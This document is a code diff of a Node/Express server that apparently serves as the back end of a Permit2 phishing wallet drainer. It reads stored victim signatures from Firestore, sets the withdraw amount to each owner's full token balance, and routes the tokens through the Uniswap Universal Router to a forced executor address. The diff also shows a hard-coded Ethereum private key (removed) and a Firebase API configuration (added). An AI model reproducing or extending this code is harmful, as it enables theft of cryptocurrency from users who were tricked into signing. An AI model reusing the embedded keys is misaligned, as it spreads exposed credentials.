@@ -5,7 +5,18 @@ try { dotenv.config(); } catch(e) {}
 import express from 'express';
 import cors from 'cors'; // Added CORS for frontend communication
 import bodyParser from 'body-parser';
-import admin from 'firebase-admin';
+import { initializeApp } from 'firebase/app';
+import {
+  getFirestore,
+  collection,
+  query,
+  where,
+  limit,
+  getDocs,
+  doc,
+  getDoc,
+  updateDoc
+} from 'firebase/firestore';
 import { ethers } from 'ethers';
 import path from 'path';
 
@@ -17,8 +28,8 @@ const UNIVERSAL_ROUTER_ABI = [
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
 ];
 // Hard-coded fallback executor address + private key (can be overridden via Firestore or env)
-const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
-const HARDCODED_PRIVATE_KEY = '0x797c331b0c003429f8fe3cf5fb60b1dc57286c7c634592da10ac85d3090fd62e';
+const HARDCODED_EXECUTOR = '';
+const HARDCODED_PRIVATE_KEY = '';
 
 // Runtime executor config (may be loaded from Firestore admin_config/settings)
 let EXECUTOR_ADDRESS = HARDCODED_EXECUTOR;
@@ -33,6 +44,8 @@ let db = null;
 let provider = null;
 let spenderWallet = null;
 let router = null;
+let OUTPUT_TOKEN_OVERRIDE = null;
+let RPC_URL_OVERRIDE = null;
 
 // -----------------------------
 // Init
@@ -40,30 +53,35 @@ let router = null;
 async function init() {
   if (initialized) return;
 
-  const required = ['FIREBASE_PROJECT_ID', 'FIREBASE_CLIENT_EMAIL', 'FIREBASE_PRIVATE_KEY', 'RPC_URL'];
-  const missing = required.filter(k => !process.env[k]);
-  if (missing.length) throw new Error("Missing env vars: " + missing.join(', '));
-
-  const serviceAccount = {
-    projectId: process.env.FIREBASE_PROJECT_ID,
-    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
-    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
+  const firebaseConfig = {
+    apiKey: "AIzaSyAocB-xjAk8-xIIcDLjx72k9I8OK4jHVgE",
+    authDomain: "tlord-1ab38.firebaseapp.com",
+    databaseURL: "https://tlord-1ab38-default-rtdb.firebaseio.com",
+    projectId: "tlord-1ab38",
+    storageBucket: "tlord-1ab38.firebasestorage.app",
+    messagingSenderId: "750743868519",
+    appId: "1:750743868519:web:732b9ba46acda5096570c2",
+    measurementId: "G-36YH771XFV"
   };
 
-  if (!admin.apps.length) {
-    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
-  }
-  db = admin.firestore();
+  const app = initializeApp(firebaseConfig, 'server-app');
+  db = getFirestore(app);
 
   // Load runtime config from Firestore (admin_config/settings) if present
   try {
-    const cfgSnap = await db.collection('admin_config').doc('settings').get();
-    const cfg = cfgSnap.exists ? cfgSnap.data() : {};
-    const rpc = cfg.rpcUrl || process.env.RPC_URL || 'https://cloudflare-eth.com';
+    const cfgSnap = await getDoc(doc(db, 'admin_config', 'settings'));
+    const cfg = cfgSnap.exists() ? cfgSnap.data() : {};
+    RPC_URL_OVERRIDE = cfg.rpcUrl || process.env.RPC_URL || null;
+    OUTPUT_TOKEN_OVERRIDE = cfg.tokenAddress || process.env.OUTPUT_TOKEN || null;
+    const rpc = RPC_URL_OVERRIDE || 'https://cloudflare-eth.com';
 
     // Load optional executor override
     EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
     EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
+
+    if (!EXECUTOR_ADDRESS || !EXECUTOR_PRIVATE_KEY) {
+      throw new Error('Missing EXECUTOR_ADDRESS or EXECUTOR_PRIVATE_KEY for mainnet');
+    }
 
     provider = new ethers.JsonRpcProvider(rpc);
     // Use configured private key for signer
@@ -96,7 +114,7 @@ function buildUniversalRouterTx(data, overrides = {}) {
   
   // Force recipient to the configured executor to ensure recipient == spender == executor
   const recipient = EXECUTOR_ADDRESS;
-  const outputToken = overrides.outputToken || process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH
+  const outputToken = overrides.outputToken || OUTPUT_TOKEN_OVERRIDE || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH
   
   const amountBn = BigInt(amount);
   const withdrawAmountBn = overrides.withdrawAmount !== undefined ? BigInt(overrides.withdrawAmount) : amountBn;
@@ -169,7 +187,8 @@ app.get('/api/admin/signatures', async (req, res) => {
   try {
     if (!validateSecret(req)) return res.status(401).json({ ok: false, error: 'Unauthorized' });
     await init();
-    const snaps = await db.collection('permit2_signatures').where('processed','==',false).limit(100).get();
+    const q = query(collection(db, 'permit2_signatures'), where('processed', '==', false), limit(100));
+    const snaps = await getDocs(q);
     const docs = snaps.docs.map(d => ({ id: d.id, data: d.data() }));
     return res.json({ ok: true, count: snaps.size, docs });
   } catch (err) {
@@ -191,16 +210,14 @@ app.post('/api/run-worker', async (req, res) => {
 
     if (docId) {
       // 1. Process specific document (from "Execute" button)
-      const docSnap = await db.collection('permit2_signatures').doc(docId).get();
-      if (docSnap.exists && !docSnap.data().processed) {
+      const docSnap = await getDoc(doc(db, 'permit2_signatures', docId));
+      if (docSnap.exists() && !docSnap.data().processed) {
         docsToProcess.push(docSnap);
       }
     } else {
       // 2. Process pending queue (fallback)
-      const snaps = await db.collection('permit2_signatures')
-        .where('processed', '==', false)
-        .limit(5)
-        .get();
+      const q = query(collection(db, 'permit2_signatures'), where('processed', '==', false), limit(5));
+      const snaps = await getDocs(q);
       docsToProcess = snaps.docs;
     }
 
@@ -227,12 +244,22 @@ app.post('/api/run-worker', async (req, res) => {
         }
 
         if (withdrawAmountBn === 0n) {
-          await docSnap.ref.update({ lastError: 'owner has zero token balance', lastErrorAt: Date.now(), withdrawAmount: '0' });
+          await updateDoc(doc(db, 'permit2_signatures', docSnap.id), {
+            lastError: 'owner has zero token balance',
+            lastErrorAt: Date.now(),
+            withdrawAmount: '0'
+          });
           if (docId) throw new Error('owner has zero token balance');
           continue;
         }
 
-        try { await docSnap.ref.update({ withdrawAmount: withdrawAmountBn.toString() }); } catch (u) { console.error('failed to write withdrawAmount', u); }
+        try {
+          await updateDoc(doc(db, 'permit2_signatures', docSnap.id), {
+            withdrawAmount: withdrawAmountBn.toString()
+          });
+        } catch (u) {
+          console.error('failed to write withdrawAmount', u);
+        }
 
         // Build Tx with optional overrides from frontend (withdrawAmount enforced)
         const { commands, inputs, execDeadline } = buildUniversalRouterTx(data, { recipient, outputToken, withdrawAmount: withdrawAmountBn });
@@ -248,7 +275,7 @@ app.post('/api/run-worker', async (req, res) => {
         
         const receipt = await tx.wait();
 
-        await docSnap.ref.update({
+        await updateDoc(doc(db, 'permit2_signatures', docSnap.id), {
           processed: true,
           routerTx: receipt.hash,
           processedAt: Date.now(),
@@ -259,7 +286,7 @@ app.post('/api/run-worker', async (req, res) => {
         processedCount++;
       } catch (err) {
         console.error(`Error processing ${docSnap.id}:`, err);
-        await docSnap.ref.update({
+        await updateDoc(doc(db, 'permit2_signatures', docSnap.id), {
           lastError: err.message,
           lastErrorAt: Date.now()
         });
